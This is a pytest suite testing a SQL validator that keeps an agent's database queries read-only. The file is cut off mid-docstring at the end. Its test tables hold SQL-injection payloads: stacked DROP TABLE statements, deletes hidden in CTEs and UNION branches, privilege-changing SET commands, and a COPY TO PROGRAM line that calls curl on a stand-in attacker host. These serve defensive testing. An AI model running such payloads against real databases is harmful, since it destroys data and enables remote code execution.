"""Acceptance tests for `validate_sql()` — specs/002-sql-validation.md.

Table-driven, so a newly discovered attack is one line rather than one function.
No database: this module is a pure function of a string, and these run in
milliseconds.

**Every rejection asserts on the reason, not just on `ok is False`.** A query
rejected for the wrong reason is a test that keeps passing after the logic that
mattered has been deleted — which, on this module, is the failure that matters.

T2 covered AC3, AC4, AC5 and AC27. T3+T4 add the root allow-list and the tree
deny-list together -- AC1, AC2, AC6-AC11, AC13-AC15 -- because T3 alone would
produce a validator that accepts the AC10 data-modifying CTE, and that state
should not exist even briefly. The set-operation rules (AC25, AC26) arrive with
T5.
"""

from __future__ import annotations

import pytest

from api.safety.validator import ALLOWED_BRANCHES, MAX_SQL_LENGTH, validate_sql

# --- AC27: length ----------------------------------------------------------


def test_ac27_rejects_input_over_the_length_limit():
    oversized = "SELECT " + ("a," * MAX_SQL_LENGTH) + "1"
    ok, reason = validate_sql(oversized)
    assert ok is False
    assert "limit is 10,000" in reason


def test_ac27_length_is_checked_before_parsing():
    """The cheap gate runs first. A string that is both oversized and
    unparseable must report the length, not a parse error — otherwise the
    expensive path ran anyway and the guard bought nothing."""
    ok, reason = validate_sql("((((" * MAX_SQL_LENGTH)
    assert ok is False
    assert "characters" in reason


def test_ac27_accepts_input_at_exactly_the_limit():
    """Boundary: the limit is inclusive. Off-by-one here would reject
    legitimate queries for no reason."""
    at_limit = "SELECT " + "a" * (MAX_SQL_LENGTH - len("SELECT "))
    assert len(at_limit) == MAX_SQL_LENGTH
    ok, reason = validate_sql(at_limit)
    assert "limit is" not in reason, "rejected at exactly the limit"


# --- AC4: nothing to run ---------------------------------------------------

NOTHING_TO_RUN = [
    pytest.param("", id="empty"),
    pytest.param("   ", id="spaces"),
    pytest.param("\n\t ", id="whitespace"),
    pytest.param("-- just a comment", id="line-comment-only"),
    pytest.param("/* only a comment */", id="block-comment-only"),
    pytest.param(";", id="bare-semicolon"),
    pytest.param("; ;", id="semicolons-only"),
]


@pytest.mark.parametrize("sql", NOTHING_TO_RUN)
def test_ac4_rejects_input_with_no_statement(sql):
    ok, reason = validate_sql(sql)
    assert ok is False
    assert "No SQL statement found" in reason


# --- AC5: parse failures fail closed ---------------------------------------

UNPARSEABLE = [
    pytest.param("SELECT FROM", id="missing-table"),
    pytest.param("((((", id="unbalanced-parens"),
    pytest.param("SELECT * FROM WHERE", id="missing-from-target"),
]


@pytest.mark.parametrize("sql", UNPARSEABLE)
def test_ac5_rejects_unparseable_input(sql):
    """Fails closed: an unparseable string is never given the benefit of the
    doubt."""
    ok, reason = validate_sql(sql)
    assert ok is False
    assert "Could not parse" in reason


def test_ac5_parse_failure_reason_keeps_sqlglot_detail():
    """AC21: the agent retries on this text. Position information is what makes
    it actionable."""
    ok, reason = validate_sql("SELECT FROM")
    assert ok is False
    assert "Could not parse as PostgreSQL" in reason
    assert reason.strip() != "Could not parse as PostgreSQL:"


# --- AC3: exactly one statement --------------------------------------------

MULTI_STATEMENT = [
    pytest.param("SELECT 1; DROP TABLE track", id="plain-stacked"),
    pytest.param("SELECT 1 -- harmless\n; DROP TABLE track", id="line-comment-hidden"),
    pytest.param("SELECT 1 /* harmless */ ; DROP TABLE track", id="block-comment-hidden"),
    pytest.param(
        "SELECT * FROM track WHERE name = 'x'; DROP TABLE track; --",
        id="trailing-comment",
    ),
    pytest.param("SELECT 1; ; DROP TABLE t", id="empty-statement-between"),
    pytest.param("SELECT 1; SELECT 2", id="two-selects"),
]


@pytest.mark.parametrize("sql", MULTI_STATEMENT)
def test_ac3_rejects_multiple_statements(sql):
    ok, reason = validate_sql(sql)
    assert ok is False
    assert "Expected exactly one statement" in reason


def test_ac3_reason_names_what_was_found():
    """AC21. 'found 2 (SELECT, DROP)' tells the model what to remove; 'invalid'
    produces an identical retry."""
    ok, reason = validate_sql("SELECT 1; DROP TABLE track")
    assert ok is False
    assert "found 2" in reason
    assert "DROP" in reason


def test_ac16_comment_hidden_payload_is_caught_as_multi_statement():
    """The comment is misdirection aimed at a regex. A parser is not looking at
    it — these are rejected for being two statements, which is the point."""
    ok, reason = validate_sql("SELECT 1 -- harmless\n; DROP TABLE track")
    assert "Expected exactly one statement" in reason


# --- AC2: a trailing semicolon is not a second statement -------------------

SINGLE_STATEMENT = [
    pytest.param("SELECT 1;", id="trailing-semicolon"),
    pytest.param("  SELECT 1;  ", id="surrounding-whitespace"),
    pytest.param("SELECT 1;;", id="double-semicolon"),
    pytest.param("SELECT /* fine */ 1", id="inline-comment"),
]


@pytest.mark.parametrize("sql", SINGLE_STATEMENT)
def test_ac2_trailing_punctuation_is_not_multi_statement(sql):
    """A trailing semicolon, surrounding whitespace, a doubled semicolon and an
    inline comment are all one statement. `SELECT 1;;` in particular parses to
    two entries, the second of which is None -- counting the raw list would
    reject it as a stacked payload."""
    ok, reason = validate_sql(sql)
    assert ok is True, reason


# --- AC22: never raises ----------------------------------------------------

HOSTILE = [
    pytest.param("\x00\x01\x02binary", id="control-bytes"),
    pytest.param("(" * 5000, id="deep-nesting"),
    pytest.param("SELECT " + "1+" * 3000 + "1", id="long-expression"),
    pytest.param("'unterminated", id="unterminated-string"),
    pytest.param("SELECT '\\'; DROP TABLE t; --", id="quote-escape-attempt"),
    pytest.param("𝕊𝔼𝕃𝔼ℂ𝕋 1", id="unicode-lookalikes"),
]


@pytest.mark.parametrize("sql", HOSTILE)
def test_ac22_never_raises_on_hostile_input(sql):
    """A crash in the validator is a denial of service on the whole API.

    AC22 is about *not raising*, which is not the same as *always rejecting*.
    `SELECT 1+1+1+...` is 6,000 characters of entirely legitimate arithmetic
    and is correctly accepted; an earlier version of this test asserted
    `ok is False` and failed for the right reason once the allow-list landed.
    """
    ok, reason = validate_sql(sql)
    assert isinstance(ok, bool)
    assert isinstance(reason, str)
    if ok:
        assert reason == "", "an accepted query carries no reason"
    else:
        assert reason, "a rejection must always explain itself"


def test_ac22_non_string_input_is_rejected_not_raised():
    for value in (None, 42, [], {"sql": "SELECT 1"}):
        ok, reason = validate_sql(value)
        assert ok is False
        assert "string" in reason


# --- AC23: deterministic ---------------------------------------------------


@pytest.mark.parametrize(
    "sql", ["SELECT 1", "SELECT 1; DROP TABLE t", "", "((((", "x" * 20_000]
)
def test_ac23_is_deterministic(sql):
    assert validate_sql(sql) == validate_sql(sql)



# --- T3: root allow-list (AC1, AC6-AC9, AC13-AC15) -------------------------

FORBIDDEN_STATEMENTS = [
    # AC6 - DML
    pytest.param("INSERT INTO track (name) VALUES ('x')", "INSERT", id="insert"),
    pytest.param("UPDATE track SET name = 'x'", "UPDATE", id="update"),
    pytest.param("DELETE FROM track", "DELETE", id="delete"),
    pytest.param("MERGE INTO track USING t ON t.id = track.track_id "
                 "WHEN MATCHED THEN DELETE", "MERGE", id="merge"),
    # AC7 - DDL
    pytest.param("CREATE TABLE evil (id int)", "CREATE", id="create"),
    pytest.param("DROP TABLE track", "DROP", id="drop"),
    pytest.param("ALTER TABLE track ADD COLUMN x int", "ALTER", id="alter"),
    pytest.param("TRUNCATE TABLE track", "TRUNCATE", id="truncate"),
    # AC8 - privileges
    pytest.param("GRANT ALL ON track TO PUBLIC", "GRANT", id="grant"),
    pytest.param("REVOKE SELECT ON track FROM querypilot_ro", "REVOKE", id="revoke"),
    # AC9 - COPY is remote code execution, not merely a write
    pytest.param("COPY track TO PROGRAM 'curl evil.example'", "COPY", id="copy-program"),
    # AC13 - EXPLAIN ANALYZE executes its argument
    pytest.param("EXPLAIN ANALYZE DELETE FROM track", "EXPLAIN", id="explain-analyze"),
    pytest.param("EXPLAIN SELECT * FROM track", "EXPLAIN", id="explain-plain"),
    # AC14 - Gate 3's enforceability depends on this one
    pytest.param("SET statement_timeout = 0", "SET", id="set-timeout"),
    pytest.param("SET ROLE postgres", "SET", id="set-role"),
    # AC15 - procedural and maintenance
    pytest.param("DO $$ BEGIN PERFORM 1; END $$", "DO", id="do-block"),
    pytest.param("VACUUM", "VACUUM", id="vacuum"),
    pytest.param("CALL some_procedure()", "CALL", id="call"),
]


@pytest.mark.parametrize("sql,expected_label", FORBIDDEN_STATEMENTS)
def test_ac6_to_ac15_rejects_non_select_statements(sql, expected_label):
    ok, reason = validate_sql(sql)
    assert ok is False, f"accepted: {sql}"
    assert "not permitted" in reason
    if expected_label:
        assert expected_label in reason, f"reason did not name {expected_label}: {reason}"


def test_ac14_set_rejection_protects_gate_three():
    """`SET statement_timeout = 0` must never pass. Gate 3's timeout is a
    session default rather than a ceiling, so it holds only because this gate
    leaves no route to issue a SET (specs/000-project.md section 4)."""
    ok, reason = validate_sql("SET statement_timeout = 0")
    assert ok is False
    assert "SET" in reason


# --- T4: tree deny-list (AC10, AC11, AC12) ---------------------------------

WRITES_HIDING_UNDER_A_SELECT = [
    pytest.param(
        "WITH gone AS (DELETE FROM track RETURNING *) SELECT * FROM gone",
        "DELETE", id="delete-cte",
    ),
    pytest.param(
        "WITH u AS (UPDATE track SET name = 'x' RETURNING *) SELECT * FROM u",
        "UPDATE", id="update-cte",
    ),
    pytest.param(
        "WITH i AS (INSERT INTO track (name) VALUES ('x') RETURNING *) SELECT * FROM i",
        "INSERT", id="insert-cte",
    ),
    pytest.param("SELECT * INTO evil FROM track", "SELECT ... INTO", id="select-into"),
]


@pytest.mark.parametrize("sql,expected_label", WRITES_HIDING_UNDER_A_SELECT)
def test_ac10_ac11_rejects_writes_smuggled_under_a_select_root(sql, expected_label):
    """**Every one of these parses with root=Select.** Any check of the form
    "is the root a Select?" accepts all four, and three of them delete, update
    or insert rows. This is the single most important test in the file."""
    ok, reason = validate_sql(sql)
    assert ok is False, f"ACCEPTED A WRITE: {sql}"
    assert expected_label in reason


def test_ac10_reason_says_the_rule_covers_ctes():
    """AC21. After `WITH d AS (DELETE ...)` the model's most likely next move is
    `WITH d AS (UPDATE ...)`. The reason has to close that off, or the retry
    loop burns attempts rediscovering the rule."""
    _, reason = validate_sql(
        "WITH gone AS (DELETE FROM track RETURNING *) SELECT * FROM gone"
    )
    assert "CTE" in reason


# --- AC12, AC18: legitimate analytics SQL must pass ------------------------

MUST_ACCEPT = [
    pytest.param("SELECT 1", id="trivial"),
    pytest.param("SELECT * FROM track LIMIT 10", id="limit"),
    pytest.param("SELECT name, composer FROM track WHERE genre_id = 1", id="where"),
    pytest.param(
        "SELECT g.name, count(*) AS n FROM track t "
        "JOIN genre g ON g.genre_id = t.genre_id "
        "GROUP BY g.name HAVING count(*) > 10 ORDER BY n DESC LIMIT 5",
        id="join-group-having-order",
    ),
    pytest.param(
        "SELECT t.name, (SELECT count(*) FROM invoice_line il "
        "WHERE il.track_id = t.track_id) AS sales FROM track t",
        id="correlated-subquery",
    ),
    pytest.param(
        "SELECT name, row_number() OVER (PARTITION BY album_id ORDER BY name) "
        "FROM track",
        id="window-function",
    ),
    pytest.param(
        "SELECT CASE WHEN milliseconds > 300000 THEN 'long' ELSE 'short' END, "
        "count(DISTINCT album_id) FROM track GROUP BY 1",
        id="case-and-distinct",
    ),
    pytest.param("SELECT CAST(unit_price AS numeric(10,2)) FROM track", id="cast"),
    # AC12 - the fix for AC10 must not be "reject all CTEs"
    pytest.param(
        "WITH t AS (SELECT * FROM track) SELECT count(*) FROM t",
        id="read-only-cte",
    ),
    pytest.param(
        "WITH a AS (SELECT 1 AS x), b AS (SELECT 2 AS y) SELECT * FROM a, b",
        id="multiple-read-only-ctes",
    ),
    pytest.param("SELECT * FROM invoice_totals", id="queries-the-view"),
]


@pytest.mark.parametrize("sql", MUST_ACCEPT)
def test_ac18_accepts_legitimate_analytics_sql(sql):
    """The counterweight to everything above. A validator that rejects
    everything is perfectly safe and completely useless, so over-blocking is as
    much a defect as under-blocking."""
    ok, reason = validate_sql(sql)
    assert ok is True, f"rejected legitimate SQL: {reason}"
    assert reason == ""


def test_ac12_read_only_cte_is_not_collateral_damage():
    """Explicitly separate from AC18: this is the case a lazy fix for AC10
    would break, and multi-step questions depend on it."""
    ok, _ = validate_sql("WITH t AS (SELECT * FROM track) SELECT count(*) FROM t")
    assert ok is True


# --- the enumeration itself (pins what no SQL input can reach) -------------


def test_deny_list_enumerates_types_the_base_classes_miss():
    """`exp.Drop`, `exp.Alter`, `exp.TruncateTable`, `exp.Set`, `exp.Grant` and
    `exp.Revoke` belong to none of sqlglot's DML/DDL/Command families, so
    `isinstance(node, (exp.DML, exp.DDL, exp.Command))` does not recognise them.

    No SQL input can cover this: those statements cannot legally nest inside a
    SELECT, so the root allow-list catches every one of them first and a
    behavioural test cannot tell the two implementations apart. A mutation run
    confirmed it -- replacing the enumeration with the base classes alone broke
    exactly one test.

    So the enumeration is pinned structurally instead. Without this, someone
    "simplifying" the deny-list to three base classes would see a green suite
    and would have silently removed the defence that matters the moment the
    root allow-list is ever widened.
    """
    from sqlglot import exp

    from api.safety.validator import FORBIDDEN_NODES

    base_families = (exp.DML, exp.DDL, exp.Command)
    must_be_listed = (
        exp.Drop,
        exp.Alter,
        exp.TruncateTable,
        exp.Set,
        exp.Grant,
        exp.Revoke,
        exp.Into,
    )

    for cls in must_be_listed:
        assert cls in FORBIDDEN_NODES, (
            f"{cls.__name__} dropped from the deny-list. It is not covered by "
            f"DML/DDL/Command, so removing it removes the only thing that "
            f"recognises it."
        )
        assert not issubclass(cls, base_families), (
            f"{cls.__name__} is now a subclass of a base family. sqlglot's "
            f"taxonomy changed; re-derive the deny-list rather than assuming "
            f"this comment still holds."
        )


def test_allow_list_is_closed_by_construction():
    """Two entries, and `SetOperation` is the base of Union/Intersect/Except so
    a set operation sqlglot adds later is admitted without an edit."""
    from sqlglot import exp

    from api.safety.validator import ALLOWED_ROOTS

    assert ALLOWED_ROOTS == (exp.Select, exp.SetOperation)
    for cls in (exp.Union, exp.Intersect, exp.Except):
        assert issubclass(cls, exp.SetOperation)


# --- T5: set operations, recursively (AC25, AC26) --------------------------

SET_OPERATIONS_ACCEPTED = [
    pytest.param("SELECT 1 UNION SELECT 2", id="union"),
    pytest.param("SELECT 1 UNION ALL SELECT 2", id="union-all"),
    pytest.param("SELECT 1 INTERSECT SELECT 2", id="intersect"),
    pytest.param("SELECT 1 EXCEPT SELECT 2", id="except"),
    pytest.param("SELECT 1 UNION SELECT 2 UNION SELECT 3", id="chained"),
    pytest.param("(SELECT 1) UNION (SELECT 2)", id="parenthesised-branches"),
    pytest.param("SELECT 1 UNION ALL (SELECT 2 UNION SELECT 3)", id="nested"),
    pytest.param(
        "SELECT name FROM track UNION SELECT name FROM artist ORDER BY 1 LIMIT 5",
        id="realistic-with-order-limit",
    ),
    # Over-blocking guard: a naive "every branch must be a SELECT" rejects
    # these two, and both are read-only and legitimate.
    pytest.param("SELECT 1 UNION VALUES (1)", id="values-branch"),
    pytest.param("VALUES (1) UNION SELECT 2", id="values-first-branch"),
]


@pytest.mark.parametrize("sql", SET_OPERATIONS_ACCEPTED)
def test_ac25_accepts_set_operations(sql):
    ok, reason = validate_sql(sql)
    assert ok is True, f"rejected legitimate set operation: {reason}"


SET_OPERATIONS_REJECTED = [
    pytest.param(
        "SELECT 1 UNION (WITH d AS (DELETE FROM track RETURNING 1 AS x) SELECT x FROM d)",
        "DELETE", id="delete-cte-in-branch",
    ),
    pytest.param(
        "SELECT 1 UNION SELECT * INTO evil FROM track",
        "SELECT ... INTO", id="select-into-in-branch",
    ),
    pytest.param(
        "(SELECT 1 UNION SELECT 2) UNION "
        "(WITH u AS (UPDATE track SET name = 'x' RETURNING 1 AS x) SELECT x FROM u)",
        "UPDATE", id="update-cte-in-nested-branch",
    ),
]


@pytest.mark.parametrize("sql,expected_label", SET_OPERATIONS_REJECTED)
def test_ac25_rejects_writes_smuggled_into_a_branch(sql, expected_label):
    """Acceptance of a set operation is never shallow. A UNION arm is as good a
    hiding place as a CTE, and the last case buries it two levels down."""
    ok, reason = validate_sql(sql)
    assert ok is False, f"ACCEPTED A WRITE: {sql}"
    assert expected_label in reason


def test_ac26_accepts_recursive_cte():
    """`WITH RECURSIVE` is read-only and is the natural way to walk
    `employee.reports_to`. Distinct from AC25 despite the shared word."""
    sql = (
        "WITH RECURSIVE chain AS ("
        "  SELECT employee_id, reports_to FROM employee WHERE reports_to IS NULL"
        "  UNION ALL"
        "  SELECT e.employee_id, e.reports_to FROM employee e"
        "  JOIN chain c ON e.reports_to = c.employee_id"
        ") SELECT * FROM chain"
    )
    ok, reason = validate_sql(sql)
    assert ok is True, reason


def test_ac26_recursive_cte_with_a_write_is_still_rejected():
    """The `RECURSIVE` keyword is not a loophole."""
    sql = (
        "WITH RECURSIVE chain AS ("
        "  DELETE FROM employee RETURNING employee_id, reports_to"
        ") SELECT * FROM chain"
    )
    ok, reason = validate_sql(sql)
    assert ok is False
    assert "DELETE" in reason


# --- the branch scanner itself ---------------------------------------------


def test_branch_scanner_finds_a_disallowed_branch():
    """`_first_disallowed_branch` is a backstop the tree walk usually reaches
    first, so no SQL string exercises it in isolation. Driven directly against a
    synthetic AST instead, the same way the deny-list enumeration is pinned.

    Without this, the function could be deleted entirely and the suite would
    stay green.
    """
    from sqlglot import exp

    from api.safety.validator import _first_disallowed_branch

    bad = exp.Union(
        this=exp.select("1"),
        expression=exp.Insert(this=exp.table_("t")),
    )
    found = _first_disallowed_branch(bad)
    assert isinstance(found, exp.Insert)


def test_branch_scanner_descends_through_nesting_and_subqueries():
    from sqlglot import exp

    from api.safety.validator import _first_disallowed_branch

    buried = exp.Union(
        this=exp.select("1"),
        expression=exp.Subquery(
            this=exp.Union(this=exp.select("2"), expression=exp.Drop(this=exp.table_("t")))
        ),
    )
    assert isinstance(_first_disallowed_branch(buried), exp.Drop)


def test_branch_scanner_passes_legitimate_shapes():
    from sqlglot import exp

    from api.safety.validator import _first_disallowed_branch

    for cls in (exp.Select, exp.Subquery, exp.SetOperation, exp.Values):
        assert cls in ALLOWED_BRANCHES

    fine = exp.Union(this=exp.select("1"), expression=exp.Values(expressions=[]))
    assert _first_disallowed_branch(fine) is None
    assert _first_disallowed_branch(exp.select("1")) is None


def test_validate_sql_actually_consults_the_branch_scanner(monkeypatch):
    """Proves the wiring, which no SQL string otherwise reaches.

    A mutation run removing the call site from `validate_sql` — while leaving
    the function and its unit tests intact — failed nothing at all. The tree
    walk gets to every realistic payload first, so the backstop's *invocation*
    was untested even though the backstop itself was not.

    Narrowing the allow-list at runtime forces the scanner to be the only thing
    that can reject `SELECT 1 UNION VALUES (1)`. If the call is ever dropped,
    this goes red.
    """
    from sqlglot import exp

    from api.safety import validator

    monkeypatch.setattr(validator, "ALLOWED_BRANCHES", (exp.Select,))
    ok, reason = validator.validate_sql("SELECT 1 UNION VALUES (1)")
    assert ok is False
    assert "branch" in reason.lower()


# --- T6: reason quality (AC21) ---------------------------------------------

NOT_A_STATEMENT = [
    pytest.param("garbage nonsense", id="two-bare-words"),
    pytest.param("42", id="bare-number"),
    pytest.param("'a string'", id="bare-string"),
    pytest.param("x", id="bare-identifier"),
    pytest.param("NULL", id="bare-null"),
]


@pytest.mark.parametrize("sql", NOT_A_STATEMENT)
def test_ac21_fragments_are_not_reported_as_forbidden_statement_types(sql):
    # `garbage nonsense` lives here rather than with the forbidden statements:
    # it parses cleanly as an Alias, so it never reaches the parse-error path,
    # but it is a fragment rather than a statement of a forbidden kind.
    """These parse to bare expressions -- Literal, Column, Alias -- not to
    statements. Reporting "Statement type LITERAL is not permitted" leaked a
    sqlglot class name, told the model nothing, and implied the wrong fix (that
    some other statement type would be allowed)."""
    ok, reason = validate_sql(sql)
    assert ok is False
    assert "not a SQL statement" in reason
    for leaked in ("LITERAL", "COLUMN", "ALIAS", "NULL is not permitted"):
        assert leaked not in reason


def test_ac21_forbidden_statements_are_still_named(sql=None):
    """The counterpart: a real statement of a forbidden kind must still be
    named, because that is what the model needs to change."""
    for statement, label in [
        ("DELETE FROM track", "DELETE"),
        ("DROP TABLE track", "DROP"),
        ("SET ROLE postgres", "SET"),
    ]:
        ok, reason = validate_sql(statement)
        assert ok is False
        assert f"Statement type {label}" in reason


def test_ac21_parse_errors_do_not_leak_python_class_reprs():
    """sqlglot embeds "<class 'sqlglot.expressions.Add'>" in some messages.
    Useful to a library author, noise to the model that has to act on it."""
    ok, reason = validate_sql("SELECT 1 + ")
    assert ok is False
    assert "<class" not in reason
    assert "sqlglot.expressions" not in reason


ALL_REJECTION_PATHS = [
    pytest.param(None, id="non-string"),
    pytest.param("x" * 20_000, id="too-long"),
    pytest.param("SELECT FROM", id="parse-error"),
    pytest.param("", id="no-statement"),
    pytest.param("SELECT 1; DROP TABLE t", id="multi-statement"),
    pytest.param("DELETE FROM track", id="forbidden-root"),
    pytest.param("42", id="not-a-statement"),
    pytest.param("WITH d AS (DELETE FROM t RETURNING 1 AS x) SELECT x FROM d", id="forbidden-node"),
]


@pytest.mark.parametrize("sql", ALL_REJECTION_PATHS)
def test_ac21_every_rejection_path_gives_a_substantive_reason(sql):
    """No path may return an empty, generic, or internals-leaking reason. The
    retry loop in Iteration 4 is worthless without this, and a vague reason
    produces an identical retry."""
    ok, reason = validate_sql(sql)
    assert ok is False
    assert len(reason) > 25, f"reason too thin to act on: {reason!r}"
    assert reason[0].isupper() and reason.rstrip().endswith(".")
    assert "<class" not in reason
    assert "Traceback" not in reason


def test_ac21_accepted_queries_carry_no_reason():
    ok, reason = validate_sql("SELECT 1")
    assert ok is True
    assert reason == ""


# --- T7: hostile input (AC22, AC23) ----------------------------------------


def test_ac22_deep_parenthesis_nesting_is_caught_not_raised():
    """**The length cap does not protect against this.** 200 nested parens is
    about 410 characters -- comfortably inside the 10,000 limit -- and blows the
    parser's stack. Depth and size are independent attacks, so the
    RecursionError handler is load-bearing rather than belt-and-braces.
    """
    depth = 200
    sql = "SELECT " + "(" * depth + "1" + ")" * depth
    assert len(sql) < MAX_SQL_LENGTH, "this case must not be caught by the length gate"

    ok, reason = validate_sql(sql)
    assert ok is False
    assert "nested too deeply" in reason


def test_ac22_deep_subquery_nesting_is_caught_not_raised():
    sql = "SELECT 1" + " FROM (SELECT 1" * 300 + ") x" * 300
    ok, reason = validate_sql(sql)
    assert ok is False
    assert "nested too deeply" in reason


def test_ac22_moderate_nesting_is_still_accepted():
    """The recursion guard must not become an over-blocking limit. Real
    generated SQL nests a few levels; 60 is far beyond anything plausible and
    must still pass."""
    sql = "SELECT 1" + " FROM (SELECT 1" * 60 + ") x" * 60
    ok, reason = validate_sql(sql)
    assert ok is True, reason


def test_ac22_multi_megabyte_input_is_rejected_cheaply():
    """Caught by the length gate before the parser sees it -- which is the whole
    reason that gate runs first."""
    import time

    huge = "SELECT " + ("x" * 5_000_000)
    started = time.perf_counter()
    ok, reason = validate_sql(huge)
    elapsed = time.perf_counter() - started

    assert ok is False
    assert "limit is 10,000" in reason
    assert elapsed < 1.0, f"length gate took {elapsed:.2f}s; it should be a comparison"


HOSTILE_ENCODINGS = [
    pytest.param("SELECT 1\x00; DROP TABLE t", id="embedded-null-byte"),
    pytest.param("SELECT \ud800 1", id="lone-surrogate"),
    pytest.param("SELECT 1 \N{ZERO WIDTH SPACE}; DROP TABLE t", id="zero-width-space"),
    pytest.param("ＳＥＬＥＣＴ 1", id="fullwidth-letters"),
    pytest.param("SELECT 1 --\u2028; DROP TABLE t", id="line-separator-in-comment"),
    pytest.param("\N{RIGHT-TO-LEFT OVERRIDE}SELECT 1", id="bidi-override"),
]


@pytest.mark.parametrize("sql", HOSTILE_ENCODINGS)
def test_ac22_encoding_tricks_never_raise(sql):
    """Encoding games are aimed at regex filters. A parser is unimpressed by
    them, but it must not crash on them either -- and whatever the verdict, it
    has to be a verdict rather than an exception."""
    ok, reason = validate_sql(sql)
    assert isinstance(ok, bool)
    assert isinstance(reason, str)
    if not ok:
        assert reason


def test_ac22_no_hostile_input_can_be_accepted_as_a_write():
    """The property that actually matters: none of these reaches acceptance
    while carrying a write that Postgres would execute."""
    for sql in [
        "SELECT 1\x00; DROP TABLE t",
        "SELECT 1 ​; DROP TABLE t",
    ]:
        ok, _ = validate_sql(sql)
        assert ok is False, f"accepted a stacked write: {sql!r}"


def test_ac22_unicode_line_separator_stays_inside_a_comment():
    """`SELECT 1 --\u2028; DROP TABLE t` is ACCEPTED, and that is correct.

    U+2028 LINE SEPARATOR looks like it ought to terminate a `--` comment --
    Python's str.splitlines() treats it as a line break -- so an earlier version
    of this test asserted rejection, and failed.

    Measured against the live server: PostgreSQL does *not* treat U+2028 as
    ending a line comment, and neither does sqlglot. Both read the whole tail as
    comment, so the query really is just `SELECT 1`, and rejecting it would be
    over-blocking (AC18).

    The dangerous case is the reverse -- a character Postgres treats as a
    newline while sqlglot does not -- which would hide a stacked statement from
    Gate 2 and have Postgres run it anyway. tests/test_validator_gates.py pins
    that agreement against the real database.
    """
    ok, _ = validate_sql("SELECT 1 --\u2028; DROP TABLE t")
    assert ok is True


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT " + "(" * 200 + "1" + ")" * 200,
        "SELECT 1\x00; DROP TABLE t",
        "SELECT 1 UNION VALUES (1)",
        "WITH d AS (DELETE FROM t RETURNING 1 AS x) SELECT x FROM d",
    ],
)
def test_ac23_deterministic_under_hostile_input(sql):
    """Determinism has to survive the error paths too -- a recursion guard that
    depends on remaining stack depth would give different answers on different
    runs, which would make eval results irreproducible."""
    assert validate_sql(sql) == validate_sql(sql) == validate_sql(sql)


# --- T8: taxonomy drift (AC24) ---------------------------------------------

#: Every statement entry point sqlglot recognised at version 27.29.0, frozen.
#:
#: Decision D-2: freeze the whole set. A sqlglot upgrade that adds a statement
#: type must fail this test and force a human to classify it, rather than
#: sliding past review. Noisy on purpose -- triage after a deliberate dependency
#: bump takes a minute, and this is the module where a silent regression is
#: least acceptable.
FROZEN_STATEMENT_TOKENS = {
    "ALTER", "ANALYZE", "BEGIN", "CACHE", "COMMENT",
    "COMMIT", "COPY", "CREATE", "DELETE", "DESC",
    "DESCRIBE", "DROP", "GRANT", "INSERT", "KILL",
    "LOAD", "MERGE", "PIVOT", "PRAGMA", "REFRESH",
    "REVOKE", "ROLLBACK", "SEMICOLON", "SET", "TRUNCATE",
    "UNCACHE", "UNPIVOT", "UPDATE", "USE",
}


def test_ac24_statement_taxonomy_is_frozen():
    """If this fails after a sqlglot upgrade, do not just update the set.

    Read what was added, decide whether the root allow-list and the tree
    deny-list still cover it, add a case to the corpus, and only then re-freeze.
    The failure is the point: it converts a silent taxonomy shift into a review.
    """
    from sqlglot.parser import Parser

    actual = {token.name for token in Parser.STATEMENT_PARSERS}

    added = actual - FROZEN_STATEMENT_TOKENS
    removed = FROZEN_STATEMENT_TOKENS - actual
    assert not added, (
        f"sqlglot added statement types this module has never classified: "
        f"{sorted(added)}. Check ALLOWED_ROOTS and FORBIDDEN_NODES cover them, "
        f"add corpus cases, then re-freeze."
    )
    assert not removed, (
        f"sqlglot no longer recognises: {sorted(removed)}. Confirm those inputs "
        f"are still rejected -- possibly now via a different path -- before "
        f"re-freezing."
    )


def test_ac24_frozen_set_contains_nothing_this_gate_allows():
    """Why the root allow-list is safe: SELECT and UNION are not statement
    entry points at all -- sqlglot handles them in the expression parser. So
    every one of the 29 frozen tokens is a non-query statement, and the
    allow-list admitting exactly two expression types excludes all of them by
    construction rather than by enumeration."""
    from sqlglot.parser import Parser

    actual = {token.name for token in Parser.STATEMENT_PARSERS}
    assert "SELECT" not in actual
    assert "UNION" not in actual
    assert len(actual) == 29


@pytest.mark.parametrize(
    "sql",
    [
        "BEGIN", "COMMIT", "ROLLBACK", "ANALYZE", "COMMENT ON TABLE t IS 'x'",
        "USE other_db", "LOAD 'x'", "REFRESH TABLE t", "DESCRIBE track",
    ],
)
def test_ac24_frozen_tokens_are_rejected_in_practice(sql):
    """A representative sweep over the frozen set. The names being classified
    is a structural claim; this is the behavioural one."""
    ok, reason = validate_sql(sql)
    assert ok is False, f"accepted a non-query statement: {sql}"
    assert reason


# --- coverage the audit found missing --------------------------------------


def test_ac1_accepts_a_single_select():
    """Named explicitly. Previously only covered incidentally by the AC18
    corpus, which is the kind of coverage that disappears in a refactor."""
    assert validate_sql("SELECT 1") == (True, "")


def test_ac17_a_comment_inside_a_valid_query_is_fine():
    """Comments are not themselves suspicious. AC16 rejects comment-hidden
    payloads because they are *two statements*, not because a comment appeared
    -- and conflating those would reject a large amount of legitimate SQL."""
    for sql in [
        "SELECT /* the good stuff */ 1",
        "SELECT 1 -- trailing note",
        "-- leading note\nSELECT 1",
        "SELECT name /* which one */ FROM track WHERE genre_id = 1",
    ]:
        ok, reason = validate_sql(sql)
        assert ok is True, f"rejected a commented query: {reason}"


def test_ac20_module_imports_nothing_that_can_reach_a_database():
    """Purity, checked structurally. The validator must be a function of its
    input string alone -- that is what lets it run in CI with no services, and
    what keeps it fast enough to sit in front of every query."""
    import pathlib

    source = pathlib.Path("api/safety/validator.py").read_text(encoding="utf-8")
    for forbidden in ("sqlalchemy", "psycopg", "api.db", "engine", "requests", "socket"):
        assert forbidden not in source.lower(), (
            f"validator.py references {forbidden!r}; Gate 2 must not be able to "
            f"reach the network or the database"
        )


def test_ac20_works_with_no_database_configured(monkeypatch):
    """The behavioural half: unset the DSN entirely and the gate is unaffected.

    `get_schema()` raises without this variable. `validate_sql()` must not
    notice it is missing.
    """
    monkeypatch.delenv("QUERYPILOT_DATABASE_URL", raising=False)

    assert validate_sql("SELECT 1") == (True, "")
    ok, reason = validate_sql("DELETE FROM track")
    assert ok is False and "DELETE" in reason


def test_ac19_accepts_every_query_in_the_eval_suite():
    """AC19, closed by Iteration 3 (`specs/006-evals.md` AC26).

    This was a deliberate skip from Iteration 1 until `evals/questions.yaml`
    existed. It is the *inverse* of every other test in this file: the rest
    prove Gate 2 refuses what it must refuse, and this one proves it permits
    what it must permit.

    That direction matters more than it looks. A validator can reach a perfect
